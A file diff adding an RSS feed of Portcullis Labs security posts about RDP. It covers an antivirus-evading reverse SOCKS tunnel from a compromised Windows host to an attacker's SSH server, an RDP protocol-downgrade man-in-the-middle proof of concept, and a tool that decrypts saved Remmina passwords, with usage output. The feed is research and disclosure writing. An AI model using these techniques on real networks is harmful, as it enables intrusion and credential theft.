@@ -1,0 +1,1175 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; RDP</title>
+	<atom:link href="https://labs.portcullis.co.uk/tag/rdp/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/#comments</comments>
+		<pubDate>Fri, 25 Jan 2019 11:36:11 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6813</guid>
+		<description><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2). [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2).<span id="more-6813"></span></p>
+<p>I recently spent quite a long time preparing for the <a title="CREST Certified Simulated Attack Specialist" href="https://www.crest-approved.org/examination/certified-simulated-attack-specialist/index.html">CREST Certified Simulated Attack Specialist</a> exam. While I won&#8217;t be discussing exam content (which I&#8217;m under NDA for), I thought it could be beneficial to write up at least some of the interesting stuff that I prepared prior to sitting the exam.</p>
+<p>I spent a lot of time testing my tools and techniques against 5 different Anti-Virus (AV) products. I wanted to be sure that I had enough options available to me during the exam to operate efficiently, even if AV was present.  One scenario that I wanted to be prepared for was:</p>
+<ul>
+<li>Having a foothold (command execution) on a <em>Windows </em>system in an internal network; but</li>
+<li>being unable to deploy my normal C2 software (<a title="Cobalt Strike" href="https://www.cobaltstrike.com/">Cobalt Strike</a> / <a title="Meterpreter" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a>) due to Anti-Virus / Endpoint Protection.</li>
+</ul>
+<p>My practice had shown that I was able to deploy my C2 software of choice onto only 4 out 5 test systems. So this seemed like something I needed to prepare for. Just in case.</p>
+<p>In parallel with this, I&#8217;d found that performance of SOCKS over a reverse HTTPS connection was barely adequate for tunneling an RDP connection. So I was interested in finding a solution that was:</p>
+<ul>
+<li>Faster</li>
+<li>Worked through a proxy; and</li>
+<li>Worked in the presence of my nemesis AV product</li>
+</ul>
+<p>My instinct was to try to SSH out of the network and use the SOCKS proxy built into SSH.  There were a few problems with this approach:</p>
+<ol>
+<li>I needed an SSH client &#8211; which I could solve by using <a title="Putty" href="https://www.putty.org/">Putty</a> (read on for the reason I didn&#8217;t use plink)</li>
+<li>I needed to get an SSH connection out of the network &#8211; which could probably do via the proxy using <a title="HTTP CONNECT" href="https://en.wikipedia.org/wiki/HTTP_tunnel">HTTP CONNECT</a> in the same way used for legitimate TLS connections</li>
+<li>SSH allows SSH clients to send traffic through a SOCKS proxy running on the SSH server. This was the opposite to what I needed. I needed the SSH server (on the &#8220;internet&#8221;) to be able to access a SOCKS Proxy running on the SSH Client. Which is a Windows box in this scenario. If the compromised host had been a *NIX host, I could potentially have SSH&#8217;d to localhost with the -D option to get the SOCKS server running, then made a second connection to the Internet to port-forward access to the SOCKS service</li>
+</ol>
+<div id="attachment_6823" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6814"><div class="lb-album"><a href="#image-6814"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow-300x191.png" alt="Communication Flow between Devices" class="size-medium wp-image-6823"><span></span></a></div>              
+<a href="#imageclose-6814" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6814">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow.png" alt="image-6814">
+                   </div></a><p class="wp-caption-text">Communication flow between devices</p></div>
+<h2>Solving (3): SOCKS server</h2>
+<p>To solve (3) I looked for a small command line SOCKS proxy that ran on Windows. I did find some, but they all felt a bit dodgy and some said on their website that they definitely weren&#8217;t malware, despite what AV products said. Which is probably true, but it made them a poor option if I wanted to operate in the presence of AV.</p>
+<p>Eventually I stumbled on a <a title="SOCKS5 implementation written in golang" href="https://github.com/armon/go-socks5">SOCKS5 implementation written in golang</a> written by <a title="Armon Dagar" href="https://github.com/armon">Armon Dagar</a>. I&#8217;d heard that golang malware would be on the rise in 2019, so this was a good opportunity for me to waste valuable revision time on a side-interest. I&#8217;d never even compiled a golan program before. If this wasn&#8217;t too hard, it would be a nice cross-platform solution for my needs.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ mkdir -p ~/go/src
+$ cd !$
+$ git clone https://github.com/armon/go-socks5
+$ mv go-socks5 socks5
+$ cd socks5
+$ go build
+</pre>
+<p>No errors <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>But no server either. This is just a library! You need to write some code to use it. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley" /> </p>
+<p>Fortunately, the author provides an example that&#8217;s easily adapted:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+mkdir -p ~/go/src/mysocks5
+cd !$
+$ cat &lt;&lt; EOF &gt; mysocks.go
+// Create a SOCKS5 server
+package main
+import &quot;socks5&quot;
+
+func main() {
+  conf := &amp;socks5.Config{}
+  server, err := socks5.New(conf)
+  if err != nil {
+    panic(err)
+  }
+
+  // Create SOCKS5 proxy on localhost port 1080
+  if err := server.ListenAndServe(&quot;tcp&quot;, &quot;127.0.0.1:1080&quot;); err != nil {
+    panic(err)
+  }
+}
+EOF
+go build
+</pre>
+<p>Done! I now had a &#8220;mysocks5&#8243; executable. And it worked. Repeating similar steps on Windows gave me a working mysocks5.exe. I was starting to like golang at this point.</p>
+<h2>Solving (1): Putty configuration</h2>
+<p>After getting almost to the finish line with the following plink command, I couldn&#8217;t specify an HTTP proxy from the command line:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+plink -N -P 443 -i puttykey.priv.ppk -R 2080:127.0.0.1:1080 -hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a tunnnel@192.168.0.1
+</pre>
+<p>A quick overview of options here:</p>
+<ul>
+<li>-N: &#8211; I don&#8217;t need a shell, just an SSH connection for port forwarding</li>
+<li>-P 443 &#8211; Target port 443, not 22 since the proxy is likely to restrict us in this way</li>
+<li>-i puttykey.priv.ppk &#8211; The private key to access my listening SSH server, I needed logon to be non-interactive, obviously</li>
+<li>-R 2080:127.0.0.1:1080 &#8211; Open a listening port (2080) on the SSH server and forward connections to that port to 127.0.0.1:1080 on the SSH client</li>
+<li>-hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a &#8211; We don&#8217;t want any warnings or questions about unverified host keys</li>
+<li>tunnnel@192.168.0.1 &#8211; Log into 192.168.0.1 as user tunnel</li>
+</ul>
+<p>Using the normal putty.exe GUI, I saved a session that specified all of the above detail, plus the required proxy settings (unauthenticated in the case of my lab):</p>
+<div id="attachment_6822" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6815"><div class="lb-album"><a href="#image-6815"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy-300x282.png" alt="Proxy Settings for SSH Connection in Putty" class="size-medium wp-image-6822"><span></span></a></div>              
+<a href="#imageclose-6815" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6815">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy.png" alt="image-6815">
+                   </div></a><p class="wp-caption-text">Proxy settings for SSH connection in Putty</p></div>
+<p>I saved a putty session called myproxy, then retried plink:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+plink -load myproxy
+</pre>
+<p>It crashed. Hence, why I&#8217;m not using plink.  Putty works fine, though:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+putty -load myproxy
+</pre>
+<p>Well, sort of fine. The victim user would have a suspicious-looking putty window pop up alongside the mysocks console window. But this is just a PoC. Let&#8217;s ignore these missing optimisations!</p>
+<div id="attachment_6830" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6816"><div class="lb-album"><a href="#image-6816"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective-300x110.png" alt="How the attack looks from user' class="size-medium wp-image-6830"><span></span></a></div>              
+<a href="#imageclose-6816" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6816">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective.png" alt="image-6816">
+                   </div></a><p class="wp-caption-text">How the attack looks from user&#8217;s perspective</p></div>
+<p>On the server-side, we see a network listener on port 2080.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+tcp 0 0 0.0.0.0:2080 0.0.0.0:* LISTEN
+</pre>
+<p>I wanted the service bound to 0.0.0.0 for my environment, but consider that anyone with network access could abuse your SOCKS proxy.</p>
+<p>This provides a relatively high-performance SOCKS server &#8211; much better than those laggy SOCKS-over-reverse-HTTPS connections. Implants typically poll periodically over HTTPS, which means that traffic can only be sent when the implant calls home. The above method is more akin to SOCKS-over-reverse-TCP. Data can be sent in either direction immediately without waiting for a check-in. Arguably, the above method will create a more suspicious traffic pattern and some application-layer aware proxies won&#8217;t allow it (though tunneling over SSL could help).</p>
+<h2>Packaging it up</h2>
+<p>To deliver above attack, we need to package up the software and configuration so it can be run from the command line. We&#8217;ll assume that we can upload and unpack zip files for this part (or the post will get too long). I included the following in myproxy.zip:</p>
+<ul>
+<li>putty.exe</li>
+<li>mysocks5.exe</li>
+<li>myproxy.reg &#8211; Created by doing &#8220;reg export HKCU\Software\SimonTatham myproxy.reg&#8221;, then removing unnecessary configuration data in a text editor</li>
+<li>puttykey.priv.ppk &#8211; Created using puttygen, be sure to copy the openssh-format public key into ~tunnel/.ssh/authorized_key on the SSH server too</li>
+<li>mysocks.bat &#8211; See below</li>
+</ul>
+<p>To deploy, we need to run mysocks.bat, which does the following:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+reg import myproxy.reg
+start mysocks5
+putty -load myproxy
+</pre>
+<p>All finished. We can pivot through our fast SOCKS proxy. For example, to access RDP on the internal network, I&#8217;d do something like:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat /etc/proxychains.conf
+...
+socks5  127.0.0.1 2080
+$ proxychains remmina
+</pre>
+<p>Where <a title="remmina" href="https://remmina.org/">remmina</a> is a pretty awesome RDP client for Linux. You can also use <a title="proxifier" href="https://www.proxifier.com/">proxifier</a> on Windows if you&#8217;d rather use mstsc.exe.</p>
+<h2>Conclusion</h2>
+<p>We showed a PoC to get a reverse SOCKS connection out of a network using tools that won&#8217;t trigger AV. They don&#8217;t require privileges run, so would work against an unprivileged windows user. The connection is faster than if we&#8217;d used the SOCKS features of C2 solutions that use polling reverse-HTTPS connections.</p>
+<p>Our attack is untidy because the user can see everything that happens! It&#8217;s also awkward to set up because of the registry export and required packaging.</p>
+<h2>Further Reading</h2>
+<ul>
+<li><a title="Chisel" href="https://github.com/jpillora/chisel">Chisel</a> is a tool that can create a SOCKS-over-SSH-over-CONNECT-HTTP tunnel in the opposite direction the direction I needed</li>
+<li><a title="Crowbar" href="https://github.com/q3k/crowbar">Crowbar</a> is a tool that lets you do port forwarding over HTTP channels (no reliance on the proxy CONNECT method)</li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Downgrading RDP connections and how to avoid it</title>
+		<link>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/</link>
+		<comments>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/#comments</comments>
+		<pubDate>Fri, 22 Apr 2016 15:18:17 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[cryptography]]></category>
+		<category><![CDATA[MiTM]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1488</guid>
+		<description><![CDATA[<p>This post describes how Remote Desktop Protocol (RDP) connections can be vulnerable to a downgrade attack if Terminal Servers are configured insecurely. We&#8217;re not aware of this issue being discussed before &#8211; googling only found pages about installing an earlier version of the RDP client, not about downgrading the protocol in the way described here. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>This post describes how Remote Desktop Protocol (RDP) connections can be vulnerable to a downgrade attack if Terminal Servers are configured insecurely.<span id="more-1488"></span></p>
+<p>We&#8217;re not aware of this issue being discussed before &#8211; googling only found pages about installing an earlier version of the RDP client, not about downgrading the protocol in the way described here.  We suspect that it&#8217;s a known limitation of the protocol.  But it&#8217;s one that we though would be interesting to post about.</p>
+<p>In this post we provide a demonstration of such a downgrade attack using the aptly named PoC tool rdp-downgrade.py.</p>
+<h2>RDP Security Layer</h2>
+<p>Before discussing the downgrade attack, we should outline what we&#8217;ll be downgrading from and to.</p>
+<p>The following Security Layers are available in the RDP protocol. Support for each can be configured on the Terminal Server:</p>
+<ul>
+<li>Classic RDP Protocol - this is known as &#8220;RDP Security Layer&#8221; in the tscc.msc configuration tool and PROTOCOL_RDP in the <a title="protocol specification" href="http://msdn.microsoft.com/en-us/library/cc240445.aspx">protocol specification</a> (see page 40 of PDF)</li>
+<li>SSL - this is labelled &#8220;SSL&#8221; or &#8220;SSL (TLS 1.0)&#8221; in the GUI and called PROTOCOL_SSL in the protocol specification</li>
+<li>CredSSP - this is what you get when you check the &#8221;Network Layer Authentication&#8221; box. It also uses uses SSL. It is called PROTOCOL_HYBRID in protocol specification</li>
+</ul>
+<p>The first option is the insecure one. If this protocol were to be negotiated, the connection would be vulnerable to a <a title="well known &quot;Man-In-The-Middle&quot; attack" href="http://www.oxid.it/ca_um/topics/apr-rdp.htm">well known &#8220;Man-In-The-Middle&#8221; attack</a>.  Essentially, someone carrying out this attack would be able to see all your key strokes and any other data passed between client and server. This will therefore be the protocol we&#8217;ll be downgrading to.</p>
+<p>The last two options are both SSL-wrapped and are more secure.  It will be these protocols that we&#8217;ll be downgrading from.</p>
+<h2>How to tell which security layer you connected with</h2>
+<p>The various warnings displayed by the Terminal Services client, mstsc.exe can be used as a crude way to identify which protocol is being used.</p>
+<h3>Classic RDP</h3>
+<p>Note that the warning message about not being able to authenticate the server tallies with the MiTM attack described above.</p>
+<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
+<a href="#imageclose-1489" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1489">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
+                   </div></a><p class="wp-caption-text">Warning For Classic RDP Connections</p></div>
+<h3>SSL</h3>
+<p>Unless you&#8217;ve configured your host to trust the SSL certificate of the RDP server, you&#8217;ll see a certificate warning like this one:</p>
+<div id="attachment_1496" style="width: 267px" class="wp-caption alignnone"><a name="imageclose-1490"><div class="lb-album"><a href="#image-1490"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning-257x300.png" alt="ssl-warning" class="size-medium wp-image-1496"><span></span></a></div>              
+<a href="#imageclose-1490" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1490">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning.png" alt="image-1490">
+                   </div></a><p class="wp-caption-text">Warning for (Non-CredSSP) SSL Connections</p></div>
+<h3>CredSSP (NLA + SSL)</h3>
+<p>You get prompted for your username and password by a pop-up window &#8211; whereas Classic RDP and SSL both use a full Windows Desktop for password entry.</p>
+<div id="attachment_1498" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1491"><div class="lb-album"><a href="#image-1491"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/gaejegba-300x255.png" alt="gaejegba" class="size-medium wp-image-1498"><span></span></a></div>              
+<a href="#imageclose-1491" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1491">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/gaejegba.png" alt="image-1491">
+                   </div></a><p class="wp-caption-text">Dialogue Box For NLA Connections</p></div>
+<h2>Vulnerable configuration</h2>
+<p>Terminal Servers set to negotiate their Security Layer are potentially vulnerable to a downgrade attack. Here we view the settings on a Windows 2003 server, but this also holds for newer versions of Windows:</p>
+<p><a name="imageclose-1492"><div class="lb-album"><a href="#image-1492"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable-300x235.png" alt="2003-rdp-setting-vulnerable" class="alignnone size-medium wp-image-1491"><span></span></a></div>              
+<a href="#imageclose-1492" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1492">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable.png" alt="image-1492">
+                   </div></a></p>
+<h2>The downgrade attack</h2>
+<p>We will connect to a Windows 2003 RDP server configured to &#8220;Negotiate&#8221; its Security Layer.  We&#8217;ll connect from a modern windows system that supports Classic RDP, SSL and NLA. This server only supports Classic RDP and SSL. As we&#8217;d hope, the two will normally negotiate the most secure option supported by both: SSL.</p>
+<p>During this attack we will modify network traffic to make the server believe the client only supports Classic RDP. We could intercept traffic using ARP-poisoning or DNS spoofing or some other method.</p>
+<p>After connecting to TCP port 3389, the client (mstsc) sends data similar to the following (shown in hex):</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 *03* 00 00 00
+</pre>
+<p>The 03 is the protocols supported by the client. Several values are possible in this position:</p>
+<ul>
+<li>00 &#8211; Only Classic RDP is supported</li>
+<li>01 &#8211; SSL is supported in addition to Classic RDP.</li>
+<li>03 &#8211; CredSSP is supported in addition to the other two protocols.</li>
+</ul>
+<p>This is described on page 37 of the <a title="protocol specification" href="http://msdn.microsoft.com/en-us/library/cc240445.aspx">protocol specification</a>.</p>
+<p>So our proof-of-concept simply replaces the 03 with 00 to cause the client and server to negotiate Classic RDP instead of SSL.</p>
+<p>We set our tool listening on 192.168.190.170 on TCP port 3389. We instruct it to forward traffic to 192.168.2.96.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ python rdp-downgrade.py 192.168.2.96
+[Proxy] Listening for connections on 0.0.0.0:3389
+</pre>
+<p>Rather than actually doing ARP-spoofing, I just connect directly to the &#8220;Man-In-The-Middle&#8221; in this demo:</p>
+<div style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1493"><div class="lb-album"><a href="#image-1493"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon-300x177.jpg" alt="rdp-attack-prior-to-logon" ><span></span></a></div>              
+<a href="#imageclose-1493" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1493">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon.jpg" alt="image-1493">
+                   </div></a><p class="wp-caption-text">Attacker IP Address Is Entered</p></div>
+<p>Back in our PoC tool, we then see an incoming connection from the RDP client (192.168.190.1) and the proxy making an outgoing connection to the target server:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[Proxy] Incoming connection from 192.168.190.1:58715
+[Proxy] New outgoing request to 192.168.2.96:3389
+[Proxy] Connected
+</pre>
+<p>Next we see 19 bytes from the client &#8211; note the 03 near the end of the data from the client. This is recognised by our PoC tool and it prints a message to inform us the 03 has been changed to 00:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[From 192.168.190.1] Received 19 bytes
+0000 03 00 00 13 0E E0 00 00 00 00 00 01 00 08 00 03 ................
+0010 00 00 00 ...
+[From 192.168.190.1] Modified data to downgrade connection
+</pre>
+<p>Then we see traffic flow freely without further modification:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[From 192.168.2.96] Received 19 bytes
+0000 03 00 00 13 0E D0 00 00 12 34 00 02 00 08 00 00 .........4......
+0010 00 00 00 ...
+...snip...
+</pre>
+<p>mstsc shows us the warning message corresponding to a Classic RDP connection, proving that the downgrade has been successful &#8211; remember that we would normally expect a certificate warning for the SSL-wrapped RDP connection.</p>
+<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
+<a href="#imageclose-1489" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1489">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
+                   </div></a><p class="wp-caption-text">Warning Message For Classic RDP Connection</p></div>
+<h2>Conclusion</h2>
+<p>Configuring the Terminal Server to use SSL for it security layer instead of &#8220;Negotiate&#8221; prevents such a downgrade attack.</p>
+<h2>Vendor contact</h2>
+<p>We were not sure if Microsoft would consider this worthy of a security advisory. We didn&#8217;t think so, but sent them a preview of this post before publishing and asked.</p>
+<p>Microsoft who responded swiftly to confirm that &#8220;After researching the issue, we consider this behavior to be By Design&#8221;. They thanked us for our commitment to co-ordinated disclosure and gave their blessing to proceed with publication.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>RPDscan</title>
+		<link>https://labs.portcullis.co.uk/tools/rpdscan/</link>
+		<comments>https://labs.portcullis.co.uk/tools/rpdscan/#comments</comments>
+		<pubDate>Thu, 06 Nov 2014 19:46:13 +0000</pubDate>
+		<dc:creator><![CDATA[FC]]></dc:creator>
+				<category><![CDATA[Tools]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[cryptography]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=4408</guid>
+		<description><![CDATA[<p>RPDscan (Remmina Password Decrypt Scanner) is a tool to find and decrypt saved passwords in Remmina RDP configurations. Key features Finds every Remmina configuration file and preferences Decrypts every saved password for every user it finds Python based for easy access and speed Overview Remmina is a well used Linux based RDP connection software, as many people [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/rpdscan/">RPDscan</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>RPDscan (Remmina Password Decrypt Scanner) is a tool to find and decrypt saved passwords in Remmina RDP configurations.<span id="more-4408"></span></p>
+<h2>Key features</h2>
+<ul>
+<li>Finds every Remmina configuration file and preferences</li>
+<li>Decrypts every saved password for every user it finds</li>
+<li>Python based for easy access and speed</li>
+</ul>
+<h2>Overview</h2>
+<p>Remmina is a well used Linux based RDP connection software, as many people who use Linux use Remmina for connecting to multiple machines they often save the password for each connection, Remmina stores this password in an encrypted manner using a private key hidden in a seperate preference file for each user on the Linux machine. RPDscan actively finds these preference files and extracts the private key then uses this key to decrypt all of the saved passwords and then displays to the user the username the password and computer details.</p>
+<h2>Requirements</h2>
+<ul>
+<li>Python</li>
+<li>Linux target</li>
+</ul>
+<h2>Installation</h2>
+<p>Download the script onto your target machine and run, there is no installation required for this tool.</p>
+<h2>Usage</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# python RPDscan.py
+</pre>
+<p>RPDscan is initially set to search only the /home directory as 99% of all files will be in that location, however the python file can easily be edited to include the entire / tree.</p>
+<h2>Examples</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# python RPDscan.py
+found this pref file /home/fc/.remmina/remmina.pref========
+Found a conf file: /home/fc/.remmina/1366367609312.remmina
+Saved password:
+^**D!sEx@mpl3ssh_username=ssh_server=
+
+username=fc
+
+domain=
+
+server=172.16.0.266
+
+========
+Found a conf file: /home/fc/.remmina/1366641829516.remmina
+
+server=10.256.0.1
+
+Saved password:
+@n0ther3Xamp!e
+
+ssh_username=
+
+ssh_server=
+
+username=ExampleDomain\\Administrator
+
+domain=
+</pre>
+<p>Here you can see that RPDscan has found two saved password files and extracted all the data you need to connect.</p>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/RPDscan.py.tgz" target="_blank" title="Download RPDscan Py"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="RPDscan Py" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/RPDscan.py.tgz" title="Download RPDscan.py.tgz" target="_blank" id="wpfb-file-link-1">RPDscan.py.tgz</a>
+    
+    <br />
+    April 16, 2014<br />
+    
+  </div>
+  <div class="info">
+    1.1 KiB<br />
+    MD5 hash: 935738ab08748ff5ef09c2346ffc4755 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>April 16, 2014</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/tools/rpdscan/">RPDscan</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/tools/rpdscan/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Retrospective decryption of SSL-encrypted RDP sessions</title>
+		<link>https://labs.portcullis.co.uk/blog/retrospective-decryption-of-ssl-encrypted-rdp-sessions/</link>
+		<comments>https://labs.portcullis.co.uk/blog/retrospective-decryption-of-ssl-encrypted-rdp-sessions/#comments</comments>
+		<pubDate>Thu, 13 Mar 2014 06:39:51 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1520</guid>
+		<description><![CDATA[<p>This post describes how network eavesdroppers might record encrypted RDP sessions and at some later time (after a server compromise) be able to decrypt them. This could expose any data sent over the RDP connection including keystrokes, usernames and passwords. Put in more technical language: This post is about Perfect Forward Secrecy, how SSL connections often lack [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/retrospective-decryption-of-ssl-encrypted-rdp-sessions/">Retrospective decryption of SSL-encrypted RDP sessions</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>This post describes how network eavesdroppers might record encrypted RDP sessions and at some later time (after a server compromise) be able to decrypt them. This could expose any data sent over the RDP connection including keystrokes, usernames and passwords.<span id="more-1520"></span></p>
